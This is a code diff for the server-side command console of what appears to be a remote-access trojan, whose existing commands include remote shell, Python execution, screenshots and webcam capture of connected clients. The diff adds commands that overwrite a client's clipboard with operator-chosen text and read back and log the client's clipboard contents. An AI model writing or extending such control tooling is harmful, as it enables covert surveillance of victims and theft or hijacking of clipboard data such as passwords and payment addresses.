@@ -35,6 +35,8 @@ shell
 python
 screenshot
 webcam
+copy
+paste
 exit/back
 """
 
@@ -129,6 +131,10 @@ class ServerCLI(BaseServer):
                 self.screenshot(client)
             case 'webcam':
                 self.webcam(client)
+            case 'copy':
+                self.copy(client)
+            case 'paste':
+                self.paste(client)
             case _:
                 print('Command was not recognized, type "help" for help.')
 
@@ -241,6 +247,33 @@ class ServerCLI(BaseServer):
             file.write(img_data)
         logging.info('Saved webcam capture at (%s): %s' % (client.id, file_name))
         print(f'Saved webcam capture: {file_name}')
+
+    def copy(self, client: Client) -> None:
+        """ Copy to client clipboard """
+        logging.debug('Copying to client clipboard (%s)' % client.id)
+        data = input('Text to copy: ')
+        client.write(b'COPY')
+        client.write(data.encode())
+        if client.read() == b'ERROR':
+            error = client.read().decode()
+            logging.error('Error copying to client clipboard (%s): %s' % (client.id, error))
+            print(f'Error copying to client clipboard: {error}')
+        else:
+            logging.info('Copied "%s" to client clipboard (%s)' % (data, client.id))
+            print('Copied to clipboard successfully')
+
+    def paste(self, client: Client) -> None:
+        """ Paste from clipboard """
+        logging.debug('Pasting from client clipboard')
+        client.write(b'PASTE')
+        clipboard = client.read().decode()
+        if clipboard == 'ERROR':
+            error = client.read().decode()
+            logging.error('Error pasting from clipboard (%s): %s' % (client.id, error))
+            print(f'Error pasting from clipboard: {error}')
+        else:
+            logging.info('Pasted "%s" from client clipboard (%s)' % (clipboard, client.id))
+            print(f'Clipboard:\n{clipboard}')
 
 
 if __name__ == '__main__':
